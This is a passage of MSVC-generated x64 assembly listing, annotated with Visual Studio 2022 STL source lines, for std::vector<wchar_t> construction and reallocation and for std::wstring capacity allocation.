; 2067 :         auto& _My_data  = _Mypair._Myval2;
; 2068 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2069 :         if (_Count != 0) {

	test	rdx, rdx
	je	$LN104@Construct_
	push	rsi
	push	r14
	push	r15
	sub	rsp, 48					; 00000030H

; 2010 :         if (_Newcapacity > max_size()) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH

; 2060 :     _CONSTEXPR20 void _Construct_n(_CRT_GUARDOVERFLOW const size_type _Count, _Valty&&... _Val) {

	mov	r15, r9
	mov	r14, r8
	mov	rsi, rcx

; 2010 :         if (_Newcapacity > max_size()) {

	cmp	rdx, rax
	ja	$LN106@Construct_
	mov	QWORD PTR [rsp+40], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rdx+rdx]
	mov	QWORD PTR [rsp+32], rdi

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	jne	SHORT $LN19@Construct_

; 197  :         return nullptr;

	xor	edi, edi
	jmp	SHORT $LN18@Construct_
$LN19@Construct_:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN21@Construct_

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	SHORT $LN107@Construct_

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN31@Construct_

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	rdi, QWORD PTR [rax+39]
	and	rdi, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rdi-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN18@Construct_
$LN21@Construct_:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
	mov	rdi, rax
$LN18@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR [rsi], rdi

; 1995 :         _Mylast               = _Newvec;
; 1996 :         _Myend                = _Newvec + _Newcapacity;

	lea	rcx, QWORD PTR [rbx+rdi]
	mov	QWORD PTR [rsi+8], rdi
	mov	QWORD PTR [rsi+16], rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rcx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	rdx, QWORD PTR [r14]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1804 :     auto _ULast  = _RANGES _Unwrap_sent<_InIt>(_STD move(_Last));

	mov	rbx, QWORD PTR [r15]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rdx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, rbx
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1822 :                 _Dest += _ULast - _UFirst;

	sar	rbx, 1
	lea	rax, QWORD PTR [rdi+rbx*2]
	mov	rbx, QWORD PTR [rsp+40]
	mov	rdi, QWORD PTR [rsp+32]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	QWORD PTR [rsi+8], rax

; 2087 :     }

	add	rsp, 48					; 00000030H
	pop	r15
	pop	r14
	pop	rsi
$LN104@Construct_:
	ret	0
$LN31@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN106@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
	int	3
$LN107@Construct_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN103@Construct_:
??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Construct_n<wchar_t *,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@_W@std@@YA$$QEA_WAEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@_W@std@@YA$$QEA_WAEA_W@Z PROC		; std::forward<wchar_t>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@_W@std@@YA$$QEA_WAEA_W@Z ENDP		; std::forward<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??$_Emplace_back_with_unused_capacity@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z
_TEXT	SEGMENT
this$ = 8
<_Val_0>$ = 16
??$_Emplace_back_with_unused_capacity@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t>, COMDAT

; 784  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 785  :         auto& _My_data   = _Mypair._Myval2;
; 786  :         pointer& _Mylast = _My_data._Mylast;
; 787  :         _STL_INTERNAL_CHECK(_Mylast != _My_data._Myend); // check that we have unused capacity
; 788  :         if constexpr (conjunction_v<is_nothrow_constructible<_Ty, _Valty...>,
; 789  :                           _Uses_default_construct<_Alloc, _Ty*, _Valty...>>) {
; 790  :             _ASAN_VECTOR_MODIFY(1);
; 791  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	movzx	eax, WORD PTR [rdx]
	mov	r8, QWORD PTR [rcx+8]
	mov	WORD PTR [r8], ax

; 792  :         } else {
; 793  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 794  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 795  :             _ASAN_VECTOR_RELEASE_GUARD;
; 796  :         }
; 797  : 
; 798  :         _Orphan_range(_Mylast, _Mylast);
; 799  :         _Ty& _Result = *_Mylast;

	mov	rax, QWORD PTR [rcx+8]

; 800  :         ++_Mylast;

	lea	rdx, QWORD PTR [rax+2]
	mov	QWORD PTR [rcx+8], rdx

; 801  : 
; 802  :         return _Result;
; 803  :     }

	ret	0
??$_Emplace_back_with_unused_capacity@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
_TEXT	SEGMENT
this$ = 96
_Whereptr$ = 104
<_Val_0>$ = 112
??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t>, COMDAT

; 806  :     _CONSTEXPR20 pointer _Emplace_reallocate(const pointer _Whereptr, _Valty&&... _Val) {

$LN160:
	push	rbp
	push	rdi
	push	r13
	push	r15
	sub	rsp, 56					; 00000038H

; 807  :         // reallocate and insert by perfectly forwarding _Val at _Whereptr
; 808  :         _Alty& _Al        = _Getal();
; 809  :         auto& _My_data    = _Mypair._Myval2;
; 810  :         pointer& _Myfirst = _My_data._Myfirst;
; 811  :         pointer& _Mylast  = _My_data._Mylast;
; 812  : 
; 813  :         _STL_INTERNAL_CHECK(_Mylast == _My_data._Myend); // check that we have no unused capacity
; 814  : 
; 815  :         const auto _Whereoff = static_cast<size_type>(_Whereptr - _Myfirst);
; 816  :         const auto _Oldsize  = static_cast<size_type>(_Mylast - _Myfirst);

	mov	rax, QWORD PTR [rcx+8]
	mov	r15, rdx
	mov	rdx, QWORD PTR [rcx]
	mov	rbp, r15
	sub	rbp, rdx
	sub	rax, rdx
	mov	r13, r8
	sar	rbp, 1
	sar	rax, 1

; 817  : 
; 818  :         if (_Oldsize == max_size()) {

	mov	r8, 9223372036854775807			; 7fffffffffffffffH
	mov	rdi, rcx
	cmp	rax, r8
	je	$LN158@Emplace_re

; 1883 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	mov	rcx, QWORD PTR [rcx+16]
	sub	rcx, rdx
	mov	QWORD PTR [rsp+112], rbx
	sar	rcx, 1
	mov	QWORD PTR [rsp+48], rsi

; 1970 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	mov	rdx, rcx
	mov	QWORD PTR [rsp+40], r12

; 820  :         }
; 821  : 
; 822  :         const size_type _Newsize = _Oldsize + 1;

	lea	r12, QWORD PTR [rax+1]

; 1970 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	shr	rdx, 1
	mov	rax, r8
	sub	rax, rdx
	mov	QWORD PTR [rsp+32], r14
	cmp	rcx, rax
	ja	$LN138@Emplace_re

; 1971 :             return _Max; // geometric growth would overflow
; 1972 :         }
; 1973 : 
; 1974 :         const size_type _Geometric = _Oldcapacity + _Oldcapacity / 2;

	lea	rax, QWORD PTR [rdx+rcx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rsi, r12
	cmp	rax, r12
	cmovae	rsi, rax
	cmp	rsi, r8
	ja	$LN138@Emplace_re

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	add	rsi, rsi

; 196  :     if (_Bytes == 0) {

	jne	SHORT $LN27@Emplace_re

; 197  :         return nullptr;

	xor	ebx, ebx
	jmp	SHORT $LN26@Emplace_re
$LN27@Emplace_re:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rsi, 4096				; 00001000H
	jb	SHORT $LN29@Emplace_re

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rsi+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rsi
	jbe	$LN138@Emplace_re

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN118@Emplace_re

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	rbx, QWORD PTR [rax+39]
	and	rbx, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rbx-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN26@Emplace_re
$LN29@Emplace_re:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rsi
	call	??2@YAPEAX_K@Z				; operator new
	mov	rbx, rax
$LN26@Emplace_re:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 830  :         _Alty_traits::construct(_Al, _Unfancy(_Newvec + _Whereoff), _STD forward<_Valty>(_Val)...);

	movzx	ecx, WORD PTR [r13]
	lea	r14, QWORD PTR [rbx+rbp*2]
	mov	WORD PTR [r14], cx

; 831  :         _Constructed_first = _Newvec + _Whereoff;
; 832  : 
; 833  :         if (_Whereptr == _Mylast) { // at back, provide strong guarantee

	mov	rcx, rbx
	mov	r8, QWORD PTR [rdi+8]
	mov	rdx, QWORD PTR [rdi]
	cmp	r15, r8
	jne	SHORT $LN4@Emplace_re
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	r8, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 839  :         } else { // provide basic guarantee

	jmp	SHORT $LN156@Emplace_re
$LN4@Emplace_re:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	mov	r8, r15
	sub	r8, rdx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1910 :     const auto _ULast = _Get_unwrapped(_Last);

	mov	r8, QWORD PTR [rdi+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 842  :             _Uninitialized_move(_Whereptr, _Mylast, _Newvec + _Whereoff + 1, _Al);

	lea	rcx, QWORD PTR [r14+2]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	r8, r15

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, r15
$LN156@Emplace_re:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 842  :             _Uninitialized_move(_Whereptr, _Mylast, _Newvec + _Whereoff + 1, _Al);

	call	memmove

; 2027 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rdi]
	test	rcx, rcx
	je	SHORT $LN107@Emplace_re

; 2028 :             _Destroy_range(_Myfirst, _Mylast, _Al);
; 2029 :             _ASAN_VECTOR_REMOVE;
; 2030 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rdi+16]
	sub	rdx, rcx
	sar	rdx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	add	rdx, rdx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN121@Emplace_re

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN118@Emplace_re

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN121@Emplace_re:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN107@Emplace_re:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2034 :         _Mylast  = _Newvec + _Newsize;

	lea	rcx, QWORD PTR [rbx+r12*2]
	mov	QWORD PTR [rdi], rbx
	mov	r12, QWORD PTR [rsp+40]

; 843  :         }
; 844  :         _CATCH_ALL
; 845  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);
; 846  :         _Al.deallocate(_Newvec, _Newcapacity);
; 847  :         _RERAISE;
; 848  :         _CATCH_END
; 849  : 
; 850  :         _Change_array(_Newvec, _Newsize, _Newcapacity);
; 851  :         return _Newvec + _Whereoff;

	mov	rax, r14
	mov	r14, QWORD PTR [rsp+32]

; 2034 :         _Mylast  = _Newvec + _Newsize;

	mov	QWORD PTR [rdi+8], rcx

; 2035 :         _Myend   = _Newvec + _Newcapacity;

	lea	rcx, QWORD PTR [rsi+rbx]
	mov	rsi, QWORD PTR [rsp+48]
	mov	rbx, QWORD PTR [rsp+112]
	mov	QWORD PTR [rdi+16], rcx

; 852  :     }

	add	rsp, 56					; 00000038H
	pop	r15
	pop	r13
	pop	rdi
	pop	rbp
	ret	0
$LN118@Emplace_re:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN138@Emplace_re:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN158@Emplace_re:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 819  :             _Xlength();

	call	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
	int	3
$LN155@Emplace_re:
??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Capacity$ = 56
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2614 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN57:
	push	rbx
	sub	rsp, 32					; 00000020H

; 2616 :         ++_Capacity; // Take null terminator into consideration

	inc	QWORD PTR [rdx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	mov	rcx, QWORD PTR [rdx]
	mov	rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	cmp	rcx, rax
	ja	SHORT $LN47@Allocate_f

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	add	rcx, rcx

; 196  :     if (_Bytes == 0) {

	jne	SHORT $LN16@Allocate_f

; 197  :         return nullptr;

	xor	eax, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2636 :         --_Capacity;

	dec	QWORD PTR [rdx]

; 2638 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN16@Allocate_f:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN18@Allocate_f

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	SHORT $LN47@Allocate_f

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN28@Allocate_f

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2636 :         --_Capacity;

	dec	QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2638 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN18@Allocate_f:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2636 :         --_Capacity;

	dec	QWORD PTR [rbx]

; 2638 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN28@Allocate_f:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN47@Allocate_f:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN54@Allocate_f:
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
_Obj$ = 8
